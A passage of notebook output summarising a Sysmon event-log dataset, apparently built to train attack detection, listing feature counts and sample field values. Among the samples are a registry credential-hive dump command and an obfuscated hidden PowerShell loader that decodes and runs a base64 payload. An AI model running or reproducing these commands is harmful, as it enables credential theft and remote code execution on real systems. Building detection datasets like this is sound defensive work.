      "Description_tfidf_241          7\n",
      "Description_tfidf_242          7\n",
      "Description_tfidf_243          6\n",
      "Description_tfidf_244          7\n",
      "Description_tfidf_245          6\n",
      "Description_tfidf_246          7\n",
      "Description_tfidf_247          6\n",
      "Description_tfidf_248          9\n",
      "Description_tfidf_249          6\n",
      "Description_tfidf_250          8\n",
      "Description_tfidf_251          6\n",
      "Description_tfidf_252          9\n",
      "Description_tfidf_253          7\n",
      "Description_tfidf_254          8\n",
      "Description_tfidf_255          15\n",
      "Description_tfidf_256          9\n",
      "Description_tfidf_257          13\n",
      "Description_tfidf_258          8\n",
      "Description_tfidf_259          7\n",
      "Description_tfidf_260          8\n",
      "Description_tfidf_261          6\n",
      "Description_tfidf_262          10\n",
      "Description_tfidf_263          20\n",
      "Description_tfidf_264          6\n",
      "Description_tfidf_265          6\n",
      "Description_tfidf_266          9\n",
      "Description_tfidf_267          8\n",
      "Description_tfidf_268          16\n",
      "Description_tfidf_269          6\n",
      "Description_tfidf_270          15\n",
      "Description_tfidf_271          6\n",
      "Description_tfidf_272          14\n",
      "Description_tfidf_273          6\n",
      "Description_tfidf_274          8\n",
      "Description_tfidf_275          5\n",
      "Description_tfidf_276          18\n",
      "Description_tfidf_277          6\n",
      "Description_tfidf_278          6\n",
      "Description_tfidf_279          23\n",
      "Description_tfidf_280          6\n",
      "Description_tfidf_281          6\n",
      "Description_tfidf_282          11\n",
      "Description_tfidf_283          6\n",
      "Description_tfidf_284          6\n",
      "Description_tfidf_285          9\n",
      "Description_tfidf_286          6\n",
      "Description_tfidf_287          8\n",
      "Description_tfidf_288          59\n",
      "Description_tfidf_289          44\n",
      "Description_tfidf_290          7\n",
      "Description_tfidf_291          7\n",
      "Description_tfidf_292          6\n",
      "Description_tfidf_293          10\n",
      "Description_tfidf_294          6\n",
      "Description_tfidf_295          8\n",
      "Description_tfidf_296          6\n",
      "Description_tfidf_297          6\n",
      "Description_tfidf_298          6\n",
      "Description_tfidf_299          6\n",
      "Product_tfidf_28               6\n",
      "Product_tfidf_29               7\n",
      "Product_tfidf_30               6\n",
      "Product_tfidf_31               6\n",
      "Product_tfidf_32               6\n",
      "Product_tfidf_33               6\n",
      "Product_tfidf_34               6\n",
      "Product_tfidf_35               7\n",
      "Product_tfidf_36               7\n",
      "Product_tfidf_37               6\n",
      "Product_tfidf_38               6\n",
      "Product_tfidf_39               6\n",
      "Product_tfidf_40               7\n",
      "Product_tfidf_41               7\n",
      "Product_tfidf_42               6\n",
      "Product_tfidf_43               5\n",
      "Product_tfidf_44               7\n",
      "Product_tfidf_45               8\n",
      "Product_tfidf_46               6\n",
      "Product_tfidf_47               9\n",
      "Product_tfidf_48               7\n",
      "Product_tfidf_49               7\n",
      "Product_tfidf_50               6\n",
      "Product_tfidf_51               6\n",
      "Product_tfidf_52               6\n",
      "Product_tfidf_53               6\n",
      "Product_tfidf_54               5\n",
      "Product_tfidf_55               7\n",
      "Product_tfidf_56               9\n",
      "Product_tfidf_57               7\n",
      "Product_tfidf_58               6\n",
      "Product_tfidf_59               9\n",
      "Product_tfidf_60               7\n",
      "Company_tfidf_12               6\n",
      "Company_tfidf_13               6\n",
      "Company_tfidf_14               7\n",
      "Company_tfidf_15               8\n",
      "Company_tfidf_16               7\n",
      "Company_tfidf_17               6\n",
      "Company_tfidf_18               6\n",
      "Company_tfidf_19               7\n",
      "Company_tfidf_20               6\n",
      "Company_tfidf_21               6\n",
      "Company_tfidf_22               6\n",
      "Unnamed: 0                     1901979\n",
      "Product_tfidf_61               5\n",
      "Product_tfidf_62               5\n",
      "Product_tfidf_63               5\n",
      "Company_tfidf_23               5\n",
      "Company_tfidf_24               6\n",
      "Company_tfidf_25               5\n",
      "Company_tfidf_26               5\n",
      "Company_tfidf_27               6\n",
      "Company_tfidf_28               5\n",
      "Company_tfidf_29               5\n",
      "Company_tfidf_30               5\n",
      "Company_tfidf_31               6\n",
      "\n",
      "\n",
      "\n",
      "\n",
      "SystemTime                     ['0.9948422178458712', '0.0009345772664346', '0.0952871207955468', '0.6948320671763213', '0.0232595332126948', '0.9979226833501116', '0.2298542670396273', '0.0804845867805852', '0.8262988182941626', '0.5997800329969323']\n",
      "UtcTime                        ['0.8179898883271292', '0.5001666759264404', '0.0183075897321924', '0.8618850523625655', '0.555280848936052', '0.4160393344259562', '0.3821045613645202', '0.701400077782099', '0.2455881944251451', '0.5663925773654092']\n",
      "Image                          ['c: users chrsm appdata local temp is-f516m tmp foxit pdfreader setup tmp', 'c: windows system32 srtasks exe', 'c: windows syswow64 mmc exe', 'c: windows system32 disksnapshot exe', 'c: windows system32 taskkill exe', 'c: tools processexplorer procexp64 exe', 'c: program files windowsapps microsoft yourphone_1 22102 229 0_x64__8wekyb3d8bbwe phoneexperiencehost exe', 'c: users altinitat stefania appdata local microsoft onedrive 22 232 1106 0002 filesyncconfig exe', 'c: windows system32 wbem wmiadap exe', 'c: program files (x86) microsoft edgeupdate install {b1ad1de6-d9e7-4d2b-9869-bc7002539feb} edgemitmp_25175 tmp setup exe']\n",
      "CommandLine                    ['cmd exe  c \"reg exe save hklm security c: windows temp paahgrlzp\"', '\"c: program files (x86) microsoft edge application msedge exe\" --type=utility --utility-sub-type=storage mojom storageservice --lang=en-us --service-sandbox-type=utility --mojo-platform-channel-handle=2500 --field-trial-handle=1872,i,2222059548206292211,6648449513146549123,131072  prefetch:8', '\"c: program files (x86) microsoft edge application msedge exe\" --type=utility --utility-sub-type=unzip mojom unzipper --lang=en-us --service-sandbox-type=service --mojo-platform-channel-handle=8044 --field-trial-handle=2120,i,11514816967861694043,2397135569800938562,131072  prefetch:8', '\"c: program files (x86) microsoft edge application msedge exe\" --type=utility --utility-sub-type=data_decoder mojom datadecoderservice --lang=en-us --service-sandbox-type=service --mojo-platform-channel-handle=6936 --field-trial-handle=2200,i,11306265943622648430,17306781604245324437,131072  prefetch:8', \"powershell exe -executionpolicy restricted -command write-host 'final result: 1';\", '\"c: program files (x86) microsoft edge application msedge exe\" --type=renderer --display-capture-permissions-policy-allowed --js-flags=--ms-user-locale= --disable-gpu-compositing --lang=en-us --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=34 --time-ticks-at-unix-epoch=-1670250280891976 --launch-time-ticks=6207602935 --mojo-platform-channel-handle=6860 --field-trial-handle=2116,i,3288304450214820399,16031686530847943826,131072  prefetch:1', '\"c: program files (x86) microsoft edge application msedge exe\" --type=renderer --instant-process --display-capture-permissions-policy-allowed --js-flags=--ms-user-locale= --disable-gpu-compositing --lang=en-us --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=135 --time-ticks-at-unix-epoch=-1669828275133951 --launch-time-ticks=6988843275 --mojo-platform-channel-handle=4584 --field-trial-handle=2044,i,1413821435695755471,16507231761416659504,131072  prefetch:1', '\"c: program files (x86) microsoft edgeupdate install {1daac6b3-5392-43ad-8306-9398233f5504} microsoftedge_x64_107 0 1418 62_107 0 1418 56 exe\" --msedge --verbose-logging --do-not-launch-msedge --system-level --channel=stable', 'consent exe 52 534 0000020cf2afc700', '\"c: program files (x86) microsoft edge application msedge exe\" --type=renderer --disable-gpu-compositing --lang=en-us --js-flags=--ms-user-locale= --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=39 --time-ticks-at-unix-epoch=-1670426473124656 --launch-time-ticks=27373091657 --mojo-platform-channel-handle=3960 --field-trial-handle=2096,i,16567553602575800627,5760818214266078785,131072  prefetch:1']\n",
      "CurrentDirectory               ['c: users altini~1 ste appdata local temp eua53e tmp', 'z:', 'c: windows', 'c: windows systemapps microsoft windows search_cw5n1h2txyewy', 'c: program files (x86) microsoft edge application 108 0 1462 54', 'c:', 'c: users administrator attackrange', 'c: windows temp', 'c: program files (x86) microsoft edge application 108 0 1462 42', 'c: windows systemapps shellexperiencehost_cw5n1h2txyewy']\n",
      "ParentImage                    ['c: windows system32 wevtutil exe', 'c: program files (x86) microsoft edgeupdate install {b3a392b3-d1b1-4b26-b993-81e1bde1660e} edgemitmp_34f94 tmp setup exe', 'c: windows system32 userinit exe', 'c: program files (x86) event log explorer unins000 exe', 'c: program files genymobile genymotion unins000 exe', 'c: windows syswow64 mmc exe', 'c: windows system32 rundll32 exe', 'c: windows system32 disksnapshot exe', 'c: users altini~1 ste appdata local temp eu3ae5 tmp microsoftedgeupdate exe', 'c: windows system32 sppextcomobj exe']\n",
      "ParentCommandLine              ['c: windows helppane exe -embedding', 'cmd exe  c \"reg exe save hklm security c: windows temp paahgrlzp\"', 'c: windows system32 compattelrunner exe -m:appraiser dll -f:doscheduledtelemetryrun -cv:ngsz2y4bmuu7aesl 1', 'c: windows winsxs amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10 0 17763 733_none_7e30c51b4cee0b94 tiworker exe -embedding', 'powershell exe  -nop -w hidden -noni -c \"if([intptr]::size -eq 4){$b=\\'powershell exe\\'}else{$b=$env:windir+\\' syswow64 windowspowershell v1 0 powershell exe\\'};$s=new-object system diagnostics processstartinfo;$s filename=$b;$s arguments=\\'-noni -nop -w hidden -c &([scriptblock]::create((new-object system io streamreader(new-object system io compression gzipstream((new-object system io memorystream(,[system convert]::frombase64string(\\'\\'h4siaor6qweca7vw+2 asbd+ozhyp1gvkm2vyeo4vkrktzyxkariyl6botpgxsywtzfyawjt9x+ wbdb9jretsedxwmfm7mz33w743kw+4lywnmckp+odg9cnobi0urb4 mhs7jsmpmx0g8oyke0qraulxeknkwrvynhmmazy0s7sxisi 280iqcpsmjhhklqayrfyqjbuni8d3jb+il5zns+qpszpwrs1xsa2n qzrjfady75b7whpt8vamck19 17vp8fvwexqkcms1vrvmwosvqlgvf35rmsd+9sv0dqo9roe8rmojgh8uqsm4htpsresrumhiaupulwhkoctejelsbklrxryb2sqdn2e+ygiepkmalmzstpt2ex3bzqfe5 fgkak0o4fsfjki8ma+istthacmhjp5jpq8krc43cm6yc25kuilekmsblyk2a0ltkuqp2skvzscarckehlsourcxz4kdgy11rfcxsffh2eggka3eejw6pdecexf+28jaymdqa7mqh3njendcf2tjhlsgcowoinw5iw+klg9nkxccep2uwfl39sofpig2zmnwflouq0mifgntfsbpbk8o+j2sbzgppgnsyr9qvuaa+htoam7cksfgjdcelt8w0snagjirysn5ns79suiiq+6fozzqfjka+zsserskl+rtp7vghqo+6qccdaz1wjozcefni5y7ff6xioqqrncjqwftedk+exfy9grokyguku5lsoe3w3vl+628myod5orwfupucw5sfzpe5fkvmqnai9762itzgtsjsvfg2itfvowbyrvoqdjrmdewcw1pahwjhxe0jsiqep92nxkx4r7wjfsarcu7vvmbzctc pvimpdkmg s3dgs176koocgxe+af59rgxzwviewevrmikfpqpp7+ohdipoyf5irtidkytrzcklq1pjr9zuhyqjalcdxiewtglp v9kddeghfurfa8tgpwca6xtnrewlcd30fn vbwp6ertb51fdt1m845optw4593kr9cb+tca7nesc5sf7v61ltqc98y+7tx+ecrytharf7cz6z7fd122+mzswmnpk29db9eb41ndhjsvzsxlwcb1fmiobvrzfmtjkea3t1a7dqy2+zq2r5 hnwcyyi1jlqzmi946p0+nazduahwo7nfyolbswc7rt7zfsuprhrmjqu7vkrxcnnx1dcx+m2dlsdxgojwxtc3odwiqhtzjk jpddwrf7psdcg+egpcwgexsvojbfwafijk9x4fgfzz9pq3rhmvr2qj3yyaecahohwhmrcu+yv5idteiust12e1vds4sgcgwfyhjqlh5xjmtjvd2ocdvl3jnhtzosyrvxbraowyufnepvahidwd6n03fjymkrdgaej37opc2m4zmdgw+65i7gm2vhf8nftatz4k+rgvzurw+athdgipdyc42jwbsuqobsog97o7p65u32ecwegmxwjyqrskq288qua kjad3csljad+kdlli6swxmnl8uup1jd06cfl0ksewb9dzpkqxregpdlj5alg5rqvjxitjwa4unt1zgufbhuvzaiyunycgiuwjvan1zusrykrdl8pjfnqpxmc92e+h4+kjuvthoykstoishzm2u7s7q8vautpv8 ccov8gl+gn b6evap+z+fhzmerfrd6vflvwskr8y9ghtaxie1cfg9l3w1ehzqrx4tyb8ql7n+snf8+4ycdyfl4ejw78anolgn1ekaaa=\\'\\'))),[system io compression compressionmode]::decompress))) readtoend()))\\';$s useshellexecute=$false;$s redirectstandardoutput=$true;$s windowstyle=\\'hidden\\';$s createnowindow=$true;$p=[system diagnostics process]::start($s);\"', '\"c: program files (x86) microsoft edgeupdate install {1daac6b3-5392-43ad-8306-9398233f5504} microsoftedge_x64_107 0 1418 62_107 0 1418 56 exe\" --msedge --verbose-logging --do-not-launch-msedge --system-level --channel=stable', '\"c: users altinistef stefania appdata local microsoft onedrive onedrive exe\"  background', 'c: windows system32 compattelrunner exe -m:appraiser dll -f:doscheduledtelemetryrun -cv:czchnecch0wznnlu 1', '\"c: windows softwaredistribution download install am_delta_patch_1 381 467 0 exe\" wd  q', '\"c: windows microsoft net framework v4 0 30319 ngentask exe\"  runtimewide  stopevent:528']\n",
      "Initiated                      ['0', '1']\n",
      "SourceIsIpv6                   ['0', '1']\n",
      "DestinationIsIpv6              ['0', '1']\n",
      "State                          ['0']\n",
      "ImageLoaded                    ['C:\\\\Windows\\\\System32\\\\xmllite.dll', 'C:\\\\Windows\\\\System32\\\\advapi32.dll', 'C:\\\\Windows\\\\assembly\\\\NativeImages_v4.0.30319_64\\\\System.Data\\\\f27dd71df7a6fe3f43a9e7a7c4e1870c\\\\System.Data.ni.dll', 'C:\\\\Windows\\\\assembly\\\\NativeImages_v4.0.30319_64\\\\Microsoft.CSharp\\\\9311b6c382518fe61794f144e07fef90\\\\Microsoft.CSharp.ni.dll', 'C:\\\\Windows\\\\System32\\\\dxgi.dll', 'C:\\\\Windows\\\\System32\\\\dbgcore.dll', 'C:\\\\Windows\\\\System32\\\\WindowsCodecs.dll', 'C:\\\\Windows\\\\System32\\\\ExecModelClient.dll', 'C:\\\\Windows\\\\System32\\\\deviceassociation.dll', 'C:\\\\Windows\\\\System32\\\\shacct.dll']\n",
      "Signed                         ['0', '1']\n",
      "SignatureStatus                ['0']\n",
      "SourceProcessId                ['6080.0', '3576.0', '3048.0', '1176.0', '436.0', '3180.0', '3248.0', '1320.0', '5920.0', '4500.0']\n",
      "SourceThreadId                 ['3576.0', '988.0', '436.0', '5516.0', '1572.0', '3460.0', '2156.0', '4772.0', '3112.0', '5896.0']\n",
      "SourceImage                    ['nan', 'c: users altini~1 ste appdata local temp rlwbevnihkajg exe', 'c: users altini~1 ste appdata local temp idrphtgujp exe', 'c: users altini~1 ste appdata local temp lfbkcqirszrl exe', 'c: windows system32 taskmgr exe', 'c: users altini~1 ste appdata local temp qozcugc exe', 'c: users altini~1 ste appdata local temp gxeipg exe', 'c: program files splunkuniversalforwarder bin splunk-admon exe', 'c: windows system32 csrss exe', 'c: windows system32 windowspowershell v1 0 powershell exe']\n",
      "TargetImage                    ['c: windows system32 wevtutil exe', 'c: program files amazon xentools liteagent exe', 'c: windows system32 audiodg exe', 'c: windows system32 rundll32 exe', 'c: windows system32 sppextcomobj exe', 'c: windows systemapps shellexperiencehost_cw5n1h2txyewy shellexperiencehost exe', 'c: windows system32 windowspowershell v1 0 powershell exe', 'c: program files splunkuniversalforwarder bin splunk-powershell exe', 'c: windows system32 cmd exe', 'c: windows system32 dmclient exe']\n",
      "CallTrace                      ['c: windows system32 ntdll dll+a6134|c: windows system32 kernelbase dll+221bd|c: windows system32 wbem wmiprvsd dll+2597b|c: windows system32 wbem wmiprvsd dll+283dc|c: windows system32 wbem wmiprvsd dll+57817|c: windows system32 wbem wmiprvsd dll+8a475|c: windows system32 wbem wbemcore dll+bcb3|c: windows system32 wbem wbemcore dll+3393|c: windows system32 wbem wbemcore dll+22adf|c: windows system32 wbem wbemcore dll+22a19|c: windows system32 wbem wbemcore dll+21f5a|c: windows system32 wbem wbemcore dll+2c9be|c: windows system32 wbem wbemcore dll+202d8|c: windows system32 wbem wbemcore dll+390e|c: windows system32 wbem wbemcore dll+22bba|c: windows system32 wbem wbemcore dll+22a19|c: windows system32 wbem wbemcore dll+21f5a|c: windows system32 wbem wbemcore dll+22711|c: windows system32 wbem wbemcore dll+2d78c|c: windows system32 kernel32 dll+84d4|c: windows system32 ntdll dll+51781', 'c: windows system32 ntdll dll+a6134|c: windows system32 kernelbase dll+221bd|c: windows system32 shcore dll+64c8|c: windows system32 shcore dll+1c0e5|c: windows system32 windows storage dll+141a47|c: windows system32 windows storage dll+141373|c: windows system32 windows storage dll+1411f9|c: windows system32 windows storage dll+53731|c: windows system32 windows storage dll+53679|c: windows system32 windows storage dll+175f6|c: windows system32 rpcrt4 dll+7a593|c: windows system32 rpcrt4 dll+d9f41|c: windows system32 rpcrt4 dll+618a9|c: windows system32 combase dll+27a9|c: windows system32 rpcrt4 dll+62d9b|c: windows system32 combase dll+64ddc|c: windows system32 combase dll+64a92|c: windows system32 combase dll+633a8|c: windows system32 combase dll+6180f|c: windows system32 combase dll+6080f|c: windows system32 combase dll+5df06|c: windows system32 combase dll+5d6ba|c: windows system32 user32 dll+121e4|c: windows system32 user32 dll+11b2c', 'c: windows system32 ntdll dll+a7404|c: windows system32 kernelbase dll+2b860|c: windows system32 kernelbase dll+6f453|c: windows system32 kernel32 dll+1d37f|c: windows system32 rpcss dll+35af2|c: windows system32 rpcss dll+3c90d|c: windows system32 rpcrt4 dll+7a593|c: windows system32 rpcrt4 dll+22b4b|c: windows system32 rpcrt4 dll+653fa|c: windows system32 rpcrt4 dll+4a274|c: windows system32 rpcrt4 dll+4918d|c: windows system32 rpcrt4 dll+49a3b|c: windows system32 rpcrt4 dll+310ac|c: windows system32 rpcrt4 dll+3152c|c: windows system32 rpcrt4 dll+1ae1c|c: windows system32 rpcrt4 dll+1c67b|c: windows system32 rpcrt4 dll+43a2a|c: windows system32 ntdll dll+1d34e|c: windows system32 ntdll dll+1ecb9|c: windows system32 kernel32 dll+84d4|c: windows system32 ntdll dll+51781', 'c: windows system32 ntdll dll+a6134|c: windows system32 kernelbase dll+221bd|c: windows system32 shcore dll+64c8|c: windows system32 shcore dll+1c0e5|c: windows system32 windows storage dll+1419b2|c: windows system32 windows storage dll+141373|c: windows system32 windows storage dll+1411f9|c: windows system32 windows storage dll+53731|c: windows system32 windows storage dll+53679|c: windows system32 windows storage dll+175f6|c: windows system32 rpcrt4 dll+7a593|c: windows system32 rpcrt4 dll+d9f41|c: windows system32 rpcrt4 dll+618a9|c: windows system32 combase dll+27a9|c: windows system32 rpcrt4 dll+62d9b|c: windows system32 combase dll+64ddc|c: windows system32 combase dll+64a92|c: windows system32 combase dll+633a8|c: windows system32 combase dll+6180f|c: windows system32 combase dll+6080f|c: windows system32 combase dll+5df06|c: windows system32 combase dll+5d6ba|c: windows system32 user32 dll+121e4|c: windows system32 user32 dll+11b2c', 'c: windows system32 ntdll dll+a6134|c: windows system32 basesrv dll+2f47|c: windows system32 csrsrv dll+5645|c: windows system32 ntdll dll+5178f', 'c: windows system32 ntdll dll+a6134|c: windows system32 psmserviceexthost dll+966a|c: windows system32 psmserviceexthost dll+776e|c: windows system32 psmserviceexthost dll+489d|c: windows system32 psmserviceexthost dll+1a2ed|c: windows system32 psmserviceexthost dll+11055|c: windows system32 psmserviceexthost dll+108cf|c: windows system32 ntdll dll+2063e|c: windows system32 ntdll dll+1e854|c: windows system32 kernel32 dll+84d4|c: windows system32 ntdll dll+51781', 'c: windows system32 ntdll dll+a5ec4|c: windows system32 basesrv dll+2f47|c: windows system32 csrsrv dll+5645|c: windows system32 ntdll dll+6e87f', 'c: windows system32 ntdll dll+a6134|c: windows system32 kernelbase dll+5eab4|c: windows system32 lsm dll+1f3a|c: windows system32 rpcrt4 dll+7a593|c: windows system32 rpcrt4 dll+d9f41|c: windows system32 rpcrt4 dll+62d4c|c: windows system32 rpcrt4 dll+4a274|c: windows system32 rpcrt4 dll+4918d|c: windows system32 rpcrt4 dll+49a3b|c: windows system32 rpcrt4 dll+310ac|c: windows system32 rpcrt4 dll+3152c|c: windows system32 rpcrt4 dll+1ae1c|c: windows system32 rpcrt4 dll+1c67b|c: windows system32 rpcrt4 dll+43a2a|c: windows system32 ntdll dll+1d34e|c: windows system32 ntdll dll+1ecb9|c: windows system32 kernel32 dll+84d4|c: windows system32 ntdll dll+51781', 'c: windows system32 ntdll dll+a6134|c: windows system32 kernelbase dll+5eab4|c: windows system32 lsm dll+e9d6|c: windows system32 lsm dll+1439d|c: windows system32 rpcrt4 dll+7a593|c: windows system32 rpcrt4 dll+d9f41|c: windows system32 rpcrt4 dll+62d4c|c: windows system32 rpcrt4 dll+4a274|c: windows system32 rpcrt4 dll+4918d|c: windows system32 rpcrt4 dll+49a3b|c: windows system32 rpcrt4 dll+310ac|c: windows system32 rpcrt4 dll+3152c|c: windows system32 rpcrt4 dll+1ae1c|c: windows system32 rpcrt4 dll+1c67b|c: windows system32 rpcrt4 dll+43a2a|c: windows system32 ntdll dll+1d34e|c: windows system32 ntdll dll+1ecb9|c: windows system32 kernel32 dll+84d4|c: windows system32 ntdll dll+51781', 'c: windows system32 ntdll dll+a6cc4|c: windows system32 fntcache dll+17acf|c: windows system32 fntcache dll+1a697|c: windows system32 fntcache dll+1aacc|c: windows system32 fntcache dll+5034e|c: windows system32 fntcache dll+50052|c: windows system32 kernel32 dll+84d4|c: windows system32 ntdll dll+51781']\n",
      "SourceUser                     ['nan', '0', 'stefania altinitat', 'nt authority system', '0 0', 'attackrange reed_schmidt', 'attackrange administrator', 'stefania altinistef', 'nt authority network service']\n",
      "TargetUser                     ['nan', '0', 'stefania altinitat', 'nt authority system', '0 0', 'window manager dwm-2', 'window manager dwm-1', 'nt authority local service', 'attackrange reed_schmidt', 'attackrange administrator']\n",
      "TargetFilename                 ['c: program files windowsapps microsoft yourphone_1 22112 142 0_x64__8wekyb3d8bbwe system linq parallel dll', 'c: program files windowsapps microsoft yourphone_1 22112 142 0_x64__8wekyb3d8bbwe pt-br windowsbase resources dll', 'c: users altinitat stefania appdata local microsoft onedrive 22 227 1030 0001 updateringsettings dll', 'c: windows assembly nativeimages_v4 0 30319_64 temp 17a0-0 microsoft powershell diagnostics activities dll', 'c: users altini~1 ste appdata local temp euf936 tmp msedgeupdateres_am dll', 'c: users altinitat stefania appdata local microsoft onedrive 22 227 1030 0001 libegl dll', 'c: program files windowsapps microsoft yourphone_1 22102 229 0_x64__8wekyb3d8bbwe system web httputility dll', 'c: windows assembly nativeimages_v4 0 30319_64 temp 19c4-0 system windows forms dll', 'c: program files (x86) microsoft office office12 excel exe', 'c: program files windowsapps microsoft yourphone_1 22112 142 0_x64__8wekyb3d8bbwe zh-hant system windows forms design resources dll']\n",
      "CreationUtcTime                ['0.7036285277352982', '0.9951341582093702', '0.6623383845405255', '0.426803837063812', '0.9788127346030864', '0.2235228694564159', '0.0126511886556374', '0.8279160294730988', '0.3954678159321562', '0.0987904907549006']\n",
      "TargetObject                   ['registry a {0fc8a9bb-e838-87c3-41d9-f3d55391d81b} root inventoryapplicationfile msedge_pwa_launc|c9480937f96172bb binproductversion', 'registry a {0c206a16-415a-53ce-9ef9-60067705eced} root inventoryapplicationfile microsoft msn we|f2cafba57482fb1a linkdate', 'registry a {fe472076-0dcd-896c-3a9a-5b98ce14f905} root inventoryapplicationfile setup exe|4a41fceabf85d9fd binproductversion', 'registry a {09e83960-58de-ea93-2257-7c2a713e7f37} root inventoryapplicationfile onedrivesetup ex|c24f0c323a0223b3 lowercaselongpath', 'registry a {0fc8a9bb-e838-87c3-41d9-f3d55391d81b} root inventoryapplicationfile microsoft msn we|d47a1e63f730c31b binproductversion', 'registry a {e7865ed6-e84c-88db-f1fd-3be150d460fc} root inventoryapplicationfile dwm exe|f848a80c6540ffad lowercaselongpath', 'registry a {09e83960-58de-ea93-2257-7c2a713e7f37} root inventoryapplicationfile microsoft sharep|640369cf72a079e2 linkdate', 'hkcr access shortcut macro 1 shell design ddeexec topic (default)', 'hklm system currentcontrolset services consentuxusersvc_840f8 imagepath', 'registry a {08a1771e-c527-f9f9-3563-6f12a534a3a7} root inventoryapplicationfile mmc exe|8471611706ce450b lowercaselongpath']\n",
      "Details                        ['03 25 2020 03:06:23', 'c: windows system32 svchost exe -k devicesflow', '10 0 19041 2006', 'c: program files windowsapps microsoft people_10 1902 633 0_x64__8wekyb3d8bbwe peopleapp exe', 'c: progra~2 micros~2 office12 groove exe  grv: \"%%1\"', 'c: program files (x86) microsoft edgewebview application 108 0 1462 76 installer setup exe', 'c: users altinitat stefania appdata local microsoft edgeupdate 1 3 171 39 psuser dll', '07 18 2009 19:34:52', '12 21 2002 20:58:22', 'c: users altinistef stefania appdata local microsoft onedrive 22 232 1106 0002 i386 filecoauthlib dll']\n",
      "PipeName                       ['nan', 'tsvcpipe-f3aae42b-6d29-4106-9be1-1abd921ef3a6', 'psexesvc-win-host-987-3456-stdout', '0', '<anonymous pipe>', '0 0', 'pshost 132815753754614208 344 defaultappdomain wsmprovhost', 'winsock2 catalogchangelistener-804-0', 'lsass', 'srvsvc']\n",
      "QueryStatus                    ['nan', '9003.0', '9852.0', '9002.0', '9701.0', '9501.0', '1223.0', '0.0', '1460.0']\n",
      "IsExecutable                   ['0', '1']\n",
      "StartFunction                  ['nan', 'CtrlRoutine', '0', '0.0', '-']\n",
      "PreviousCreationUtcTime        ['0.8529126376016329', '0.7895923025802536', '0.7456623560255694', '0.7972362565664', '0.850179062953207', '0.7633274581756191', '0.8722585609849943', '0.7782283126646345', '0.9126534877645216', '0.7428300825761389']\n",
      "ID                             ['0.0', 'nan', '0', 'GetConfigurationOptions']\n",
      "Label                          ['0', '1', '2']\n",
      "binary_Level_0                 ['0', '1']\n",
      "binary_Level_1                 ['0']\n",
      "binary_Level_2                 ['0', '1']\n",
      "binary_Level_3                 ['0', '1']\n",
      "binary_Level_4                 ['0', '1']\n",
      "binary_Level_5                 ['0', '1']\n",
      "binary_Level_6                 ['0', '1']\n",
      "binary_Level_7                 ['0', '1']\n",
      "binary_Task_0                  ['0', '1']\n",
      "binary_Task_1                  ['0', '1']\n",
      "binary_Task_2                  ['0', '1']\n",
      "binary_Task_3                  ['0', '1']\n",
      "binary_Task_4                  ['0', '1']\n",
      "binary_Task_5                  ['0', '1']\n",
      "binary_Task_6                  ['0', '1']\n",
      "binary_Task_7                  ['0', '1']\n",
      "binary_Protocol_0              ['0']\n",
      "binary_Protocol_1              ['0', '1']\n",
      "binary_Protocol_2              ['0', '1']\n",
      "binary_Protocol_3              ['0', '1']\n",
      "binary_Protocol_4              ['0', '1']\n",
      "binary_Protocol_5              ['0', '1']\n",
      "binary_Protocol_6              ['0', '1']\n",
      "binary_Protocol_7              ['1']\n",
      "binary_Version2_0              ['0', '1']\n",
      "binary_Version2_1              ['0', '1']\n",
      "binary_Version2_2              ['0', '1']\n",
      "binary_Version2_3              ['1']\n",
      "binary_Version2_4              ['0', '1']\n",
      "binary_Version2_5              ['0', '1']\n",
      "binary_Version2_6              ['0', '1']\n",
      "binary_Version2_7              ['1']\n",
      "binary_SchemaVersion_0         ['0', '1']\n",
      "binary_SchemaVersion_1         ['0', '1']\n",
      "binary_SchemaVersion_2         ['0', '1']\n",
      "binary_SchemaVersion_3         ['0', '1']\n",
      "binary_SchemaVersion_4         ['0', '1']\n",
      "binary_SchemaVersion_5         ['0', '1']\n",
      "binary_SchemaVersion_6         ['0', '1']\n",
      "binary_SchemaVersion_7         ['0', '1']\n",
      "binary_Signature_0             ['0', '1']\n",
      "binary_Signature_1             ['0', '1']\n",
      "binary_Signature_2             ['0', '1']\n",
      "binary_Signature_3             ['0', '1']\n",
      "binary_Signature_4             ['0', '1']\n",
      "binary_Signature_5             ['0', '1']\n",
      "binary_Signature_6             ['0', '1']\n",
      "binary_Signature_7             ['0', '1']\n",
      "binary_EventType_0             ['0', '1']\n",
      "binary_EventType_1             ['0', '1']\n",
      "binary_EventType_2             ['0', '1']\n",
      "binary_EventType_3             ['0', '1']\n",
      "binary_EventType_4             ['0', '1']\n",
      "binary_EventType_5             ['0', '1']\n",
      "binary_EventType_6             ['0', '1']\n",
      "binary_EventType_7             ['0', '1']\n",
      "binary_Configuration_0         ['0', '1']\n",
      "binary_Configuration_1         ['0', '1']\n",
      "binary_Configuration_2         ['0', '1']\n",
      "binary_Configuration_3         ['0', '1']\n",
      "binary_Configuration_4         ['0', '1']\n",
      "binary_Configuration_5         ['0', '1']\n",
      "binary_Configuration_6         ['0', '1']\n",
      "binary_Configuration_7         ['0', '1']\n",
      "binary_ConfigurationFileHash_0 ['0', '1']\n",
      "binary_ConfigurationFileHash_1 ['0', '1']\n",
      "binary_ConfigurationFileHash_2 ['0', '1']\n",
      "binary_ConfigurationFileHash_3 ['0', '1']\n",
      "binary_ConfigurationFileHash_4 ['0', '1']\n",
      "binary_ConfigurationFileHash_5 ['0', '1']\n",
      "binary_ConfigurationFileHash_6 ['0', '1']\n",
      "binary_ConfigurationFileHash_7 ['0', '1']\n",
      "binary_IntegrityLevel_0        ['0', '1']\n",
      "binary_IntegrityLevel_1        ['0', '1']\n",
      "binary_IntegrityLevel_2        ['0', '1']\n",
      "binary_IntegrityLevel_3        ['0', '1']\n",
      "binary_IntegrityLevel_4        ['0', '1']\n",
      "binary_IntegrityLevel_5        ['0', '1']\n",
      "binary_IntegrityLevel_6        ['0', '1']\n",
      "binary_IntegrityLevel_7        ['0', '1']\n",
      "binary_UserID_0                ['1']\n",
      "binary_UserID_1                ['0']\n",
      "binary_UserID_2                ['0', '1']\n",
      "binary_UserID_3                ['0', '1']\n",
      "binary_UserID_4                ['0', '1']\n",
      "binary_UserID_5                ['0', '1']\n",
      "binary_UserID_6                ['0', '1']\n",
      "binary_UserID_7                ['0', '1']\n",
      "binary_Computer_0              ['0', '1']\n",
      "binary_Computer_1              ['0', '1']\n",
      "binary_Computer_2              ['0', '1']\n",
